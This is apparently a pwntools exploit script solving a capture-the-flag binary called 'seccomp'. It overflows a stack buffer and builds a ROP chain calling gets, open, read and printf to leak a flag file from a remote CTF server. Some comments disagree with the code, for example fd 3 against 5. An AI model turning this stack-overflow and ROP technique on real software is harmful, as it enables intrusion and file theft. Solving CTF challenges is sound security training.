from pwn import *

e = ELF("build/seccomp")
r = remote("ctf.isss.io", 1337)
#r = process("build/seccomp")
context.terminal = ['urxvt', '-e', 'bash', '-c']

rop = ROP(e)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
POP_RSI = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
POP_RDX = rop.find_gadget(['pop rdx', 'ret'])[0]
JUNK = 0xabcd1234

payload = b''
# gets(.bss + 40) to load /home/seccomp/flag.txt to .bss
payload += p64(POP_RDI)
payload += p64(e.bss(40))
payload += p64(e.symbols['gets'])
# call open(/home/seccomp/flag, 0)
payload += p64(POP_RDI)
payload += p64(e.bss(40))
payload += p64(POP_RSI)
payload += p64(0)
payload += p64(JUNK)
payload += p64(e.symbols['open'])
# call read(3, .bss+100, 100)
payload += p64(POP_RDI)
payload += p64(5)
payload += p64(POP_RSI)
payload += p64(e.bss(100))
payload += p64(JUNK)
payload += p64(POP_RDX)
payload += p64(100)
payload += p64(e.symbols['read'])
# call puts(.bss + 100)
payload += p64(POP_RDI)
payload += p64(e.bss(100))
payload += p64(e.symbols['printf'])

#gdb.attach(r, 'b *0x40124d')

r.sendline(b'a'*0x78 + payload)
r.sendline("/home/seccomp/flag.txt")

r.interactive()
